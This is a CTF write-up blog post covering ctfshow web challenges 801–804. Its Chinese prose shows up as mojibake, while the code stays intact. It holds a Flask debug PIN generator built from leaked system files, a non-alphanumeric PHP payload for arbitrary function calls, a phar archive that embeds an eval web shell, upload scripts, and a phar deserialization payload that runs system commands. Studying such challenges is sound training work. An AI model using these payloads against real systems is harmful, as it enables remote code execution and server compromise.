---
title: ctfshow å¸¸è§å§¿åŠ¿
date: 2024-10-21 21:52:39
permalink: /pages/a43171/
author: 
  name: Cola
  link: https://the0n3.top
---
# ctfshow å¸¸è§å§¿åŠ¿

## web801

flask pinå€¼è®¡ç®—ï¼Œè¯»å–æ–‡ä»¶ï¼Œè„šæœ¬è®¡ç®—pinç ã€‚æ¢­å“ˆ

éé¢„æœŸï¼š`url/file?filename=/flag`

é¢„æœŸï¼š

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # usernameï¼Œé€šè¿‡/etc/passwd
    'flask.app',  # modnameï¼Œé»˜è®¤å€¼
    'Flask',  # é»˜è®¤å€¼
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # moddirï¼Œé€šè¿‡æŠ¥é”™è·å¾—
]
# å¡«å…¥è·å–çš„16è¿›åˆ¶å³å¯ï¼Œåé¢æ·»åŠ äº†è½¬æ¢åŠŸèƒ½
address = '02:42:ac:0c:e8:a0'
address = int(address.replace(':', ''),16)
private_bits = [
    f'{address}',  # macåè¿›åˆ¶å€¼ /sys/class/net/eth0/address
    '225374fa-04bc-4346-9f39-48fa82829ca934b345d280f694439fa54c01aa968eef81f55a7e5baa3e39db57884e39217606'  # çœ‹ä¸Šé¢machine-idéƒ¨åˆ†
]

# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)

# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![1](https://the0n3.top/medias/show800/1.png)


## web802

é™åˆ¶éå­—æ¯æ•°å­—ï¼Œå¯ä»¥ç”¨å­—ç¬¦ï¼Œè‡ªå¢æ„é€ å­—ç¬¦

æ„é€ `$_GET[_]($_GET[__])`

```php
<?php
$___=((''/'').'')[''==_];# $___ = N
$____=((''/'').'')[''==''];# $____ = A
++$____;
++$____;
++$____;
$_____=++$____; # $_____ = E

++$____;
++$____;
$______ = $____; # $______ = G

++$___;++$___;++$___;++$___;++$___;
$_______=++$___; # $______ = T# 

$________='_'.$______.$_____.$_______;
$$________[_]($$________[__]); # $_GET[_]($_GET[__])
```

ç®€åŒ–

```php
$___=((''/'').'')[''==_];$____=((''/'').'')[''==''];++$____;++$____;++$____;$_____=++$____;++$____;++$____;$______ = $____;++$___;++$___;++$___;++$___;++$___;$_______=++$___;$________='_'.$______.$_____.$_______;$$________[_]($$________[__]);
```

æ•´ä¸ªpayloadä½¿ç”¨postå‘åŒ…ï¼Œurlç¼–ç ä¸€ä¸‹ï¼Œé¿å…`$`,`=`å…·æœ‰ç‰¹æ®Šè¯­æ„

![2](https://the0n3.top/medias/show800/2.png)

## web803

pharæ–‡ä»¶åŒ…å«ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œåç»­è¯¦ç»†å­¦ä¹ ä¸€ä¸‹

è¿™é‡Œå®¡è®¡èµ·æ¥æœ‰ç‚¹å¥‡æ€ªï¼Œä¸å­˜åœ¨`$file.txt`å°±å†™ä¸€ä¸ª`$file`ï¼Œå†™äº†`$file`é‚£`$file.txt`ä¸è¿˜æ˜¯ä¸å­˜åœ¨ï¼Ÿé€šè¿‡`file_put_contents`å‡½æ•°ç›´æ¥å†™ğŸä¸ç°å®äº†ï¼Œå¯ä»¥äº†è§£åˆ°è¿™é‡Œå¯ä»¥é€šè¿‡pharæ‰“åŒ…ä¸€ä¸ª`$file.txt`åˆ°æœåŠ¡å™¨ï¼Œä½¿æ–‡ä»¶åŒ…å«æˆä¸ºäº†å¯èƒ½

```php
if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

ç”Ÿæˆpharæ–‡ä»¶ï¼Œé‡Œé¢æ‰“åŒ…ä¸€ä¸ª`a.txt`ï¼Œå†…å®¹ä¸º`<?php highlight_file(__FILE__);eval($_POST[1]);?>`

```php
<?php
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php highlight_file(__FILE__);eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```

ä½¿ç”¨pythonå‘åŒ…

```python
import requests

url="http://7fce7e3d-4206-4f91-b196-7536bde12046.challenge.ctf.show/"

data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

é€šè¿‡pharåè®®åŒ…å«æ–‡ä»¶

![3](https://the0n3.top/medias/show800/3.png)

## web804

unlinkä¼šè§¦å‘ååºåˆ—åŒ–

```php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

é‡ç‚¹åœ¨`hacker`ç±»ææ„å‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œ

```php
<?php 
class hacker{
    public $code = 'system("tac /f*;tac f*");';
}
$a=new hacker();
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "111");
$phar->stopBuffering();
?>
```

pythonå‘åŒ…

```python
import requests

url="http://4d03da6f-da2a-4b1e-beb3-b1ad422e3af6.challenge.ctf.show/"

data1={'file':'/tmp/aa.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

![4](https://the0n3.top/medias/show800/4.png)


## å¾…æ›´æ–°